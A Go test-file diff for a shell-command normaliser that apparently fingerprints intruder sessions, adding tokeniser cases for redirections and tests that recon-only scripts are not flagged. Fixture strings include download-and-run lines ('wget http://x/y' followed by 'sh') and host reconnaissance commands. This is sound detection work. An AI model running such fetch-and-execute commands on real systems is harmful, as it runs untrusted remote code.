@@ -14,7 +14,11 @@ func norm(s string) string { return strings.Join(NormalizeCommand(s), " ") }
 // resumable form of this expression (a heredoc body is cut out by source
 // lines and tokenising resumes after it), and the fuzz target checks that
 // the two agree on every input.
-var tokenRe = regexp.MustCompile(`<<<|<<-?|\d*(?:>>?|<)&(?:\d+|-)?|&>>?|\d+>>?|\n|\|\||&&|>>|[;|&<>()]|"[^"]*"|'[^']*'|[^\s;|&<>()]+`)
+// It differs in one place a regular expression cannot say: \d+< is not a
+// token before a second < (fdHeredoc), so the comparison skips those.
+var tokenRe = regexp.MustCompile(`<<<|<<-?|\d*(?:>>?|<)&(?:\d+|-)?|&>>?|\d*>\||\d*<>|\d+>>?|\d+<|\n|\|\||&&|>>|[;|&<>()]|"[^"]*"|'[^']*'|[^\s;|&<>()]+`)
+
+var fdHeredoc = regexp.MustCompile(`\d<<`)
 
 func scanAll(s string) []string {
 	var out []string
@@ -28,7 +32,7 @@ func scanAll(s string) []string {
 func TestScannerMatchesTokenRe(t *testing.T) {
 	for _, s := range []string{
 		"", " ", "a", `2>&1 &>>x >>& 3>> 1<&- <&3 >&`, "echo \"a b\" 'c;d' \"open", "x'y 'z", "a\vb\tc\fd\re\nf",
-		"<<<x <<-y <<z < > >> || && | & ; ( ) 12abc 3>f 4<f", "\xff\x00\"\xfe\"", `$(a) $((1+2)) "a\"b"`,
+		"<<<x <<-y <<z < > >> || && | & ; ( ) 12abc 3>f 4<f", "0</dev/null 2<>f <> >| 2>| >>| >|| 3<", "\xff\x00\"\xfe\"", `$(a) $((1+2)) "a\"b"`,
 	} {
 		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !reflect.DeepEqual(got, want) {
 			t.Errorf("scan(%q)\n got %q\nwant %q", s, got, want)
@@ -132,7 +136,7 @@ func FuzzNormalizeCommand(f *testing.F) {
 		f.Add(s)
 	}
 	f.Fuzz(func(t *testing.T, s string) {
-		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !reflect.DeepEqual(got, want) {
+		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !fdHeredoc.MatchString(s) && !reflect.DeepEqual(got, want) {
 			t.Fatalf("scanner disagrees with tokenRe on %q:\n got %q\nwant %q", s, got, want)
 		}
 		line := EncodeLine(s)
@@ -544,4 +548,56 @@ func TestHeredocBodyIsFingerprinted(t *testing.T) {
 	if got := Display(EncodeLine("cat <<EOF > /tmp/a\nwget http://x/y\nsh a\nEOF"), 0); got != `cat << <heredoc>\nwget <url>\nsh a > /tmp/<f>` {
 		t.Errorf("Display = %q", got)
 	}
+}
+
+// Shell syntax is not a program: reserved words and braces are skipped (and
+// keep the program slot open), `for`/`case`/`select`/`[[` lines run no
+// program, and N<file, <> and >| are redirections. Each of these made a
+// recon-only script Distinctive (audit M1).
+func TestShellSyntaxIsNotAProgram(t *testing.T) {
+	for _, s := range []string{
+		`{ id; w; uname -a; uptime; }`,
+		`0</dev/null uname -a; id; w; uptime; whoami`,
+		`echo x >| /tmp/a; id; w; uptime; whoami`,
+		`if id; then uname -a; else w; fi; uptime`,
+		`for i in 1 2 3; do id; done; while w; do uptime; done`,
+		`! id; [[ -f /x ]] && w; case $x in a) id;; esac; uptime`,
+		`id 3<> /tmp/a; w; uptime; whoami; ls`,
+	} {
+		if Distinctive([][]string{NormalizeCommand(s)}) {
+			t.Errorf("recon-only %q is Distinctive (programs %q)", s, programs(s))
+		}
+	}
+	for _, tc := range []struct{ in, want, prog string }{
+		{`0</dev/null python3 x`, `0< /dev/null python3 x`, "python3"},
+		{`2<>/tmp/a python3 x`, `2<> /tmp/<f> python3 x`, "python3"},
+		{`>| /tmp/a python3 x`, `>| /tmp/<f> python3 x`, "python3"},
+		{`if python3 x`, `if python3 x`, "python3"},
+		{`then python3 x`, `then python3 x`, "python3"},
+		{`{ python3 x`, `{ python3 x`, "python3"},
+		{`! python3 x`, `! python3 x`, "python3"},
+		{`for python3 in a`, `for <tok> in a`, ""},
+		{`[[ -x python3 ]]`, `[[ -x <tok> ]]`, ""},
+		{`}`, `}`, ""},
+		{`0<<EOF`, `<n> << <heredoc>`, "<n>"}, // fd-prefixed heredoc: unchanged
+	} {
+		got := NormalizeCommand(tc.in)
+		if s := strings.Join(got, " "); s != tc.want {
+			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
+		}
+		if p := program(segments([][]string{got})[0]); p != tc.prog {
+			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
+		}
+	}
+	if !Distinctive([][]string{NormalizeCommand(`if wget http://x/y; then sh y; fi; id; w`)}) {
+		t.Error("a real program behind `if` must still count")
+	}
+}
+
+func programs(s string) []string {
+	var out []string
+	for _, seg := range segments([][]string{NormalizeCommand(s)}) {
+		out = append(out, program(seg))
+	}
+	return out
 }
